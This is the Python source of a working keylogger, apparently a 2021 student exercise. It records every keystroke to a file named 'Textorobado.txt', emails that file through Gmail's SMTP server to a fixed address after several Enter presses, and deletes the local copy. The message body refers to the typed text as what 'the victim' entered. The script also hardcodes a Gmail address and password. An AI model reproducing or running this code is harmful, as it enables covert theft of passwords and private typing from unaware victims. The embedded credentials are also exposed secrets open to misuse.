import os
import sys
import datetime
import time
import pynput
from pynput.keyboard import Key, Listener
import smtplib
import keyboard
import smtplib, ssl
import getpass

from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def email():
    username = "wkts57@gmail.com" 
    password = "Colondrina1"
    
    destinatario = "wkts54@gmail.com"
    asunto="Reporte"
    
    #crear el mensaje
    mensaje = MIMEMultipart("alternative") #estandar
    mensaje["Subject"] = asunto
    mensaje["From"] = username
    mensaje["To"] = destinatario
    
    html = f"""
    <html>
    <body>
        PULSACIONES RUBADAS {destinatario}<br>
        ESTO ES LO QUE LA VICTIMA BUSCO O INGRESO: <b>VIVA LA INGENIERIA UNIFRANZ 2021</b> :)
    </body>
    </html>
    """
    # el contenido del mensaje como html
    parte_html= MIMEText(html, "html")
    # #agregar ese contenido al mensaje
    mensaje.attach(parte_html)
    archivo="Textorobado.txt"
    with open(archivo, "rb") as adjunto:
        contenido_adjunto = MIMEBase("application", "octet-stream")
        contenido_adjunto.set_payload(adjunto.read())
        encoders.encode_base64(contenido_adjunto)
        contenido_adjunto.add_header(
            "Content-Disposition",
            f"attachment; filename= {archivo}",
            )
        mensaje.attach(contenido_adjunto)
        mensaje_final = mensaje.as_string()
        #crear la conexion
        context = ssl.create_default_context()
        
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(username,password)
            print("Inició el HACK!")
            server.sendmail(username, destinatario, mensaje_final)
            print("Mensaje enviado")

count=0
keys=[]
active=0
arr=[]
def on_press(key):
    global keys,count,active,arr

    if key == Key.enter:

        for i in range(len(keys)):
            if active %2 !=0:
                keys[i] = str(keys[i]).upper()

            if keys[i] == "+":
                active+=1

        
        for i in range(len(keys)):
            if keys[i]=="+":
                pass
            else:
                arr.append(keys[i])

        keys=arr

        keys.append("\n")

        write_file(keys,count)
        keys=[]
        arr=[]
        
        count+=1
        if count>5:
            email()
            if os.path.exists("Textorobado.txt"):
                os.remove("Textorobado.txt")
            count=0

    print("{0}".format(key))
    
def write_file(keys,count):
    with open("Textorobado.txt", "a") as f:
        f.write(time.strftime("%d/%m/%y   "))
        f.write(time.strftime("%I:%M:%S   "))
        for key in keys:
            k=str(key).replace("'","")

            if k.find("\n")>0:
                f.write(k)
                
            elif k.find('Key')== -1:
                f.write(k)
            
def on_release(key):
    
    if key == Key.esc:
        return False
    
def main():
    if os.path.exists("Textorobado.txt"):
        os.remove("Textorobado.txt")
    else:  
        pass
    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
if __name__== '__main__':
    main()
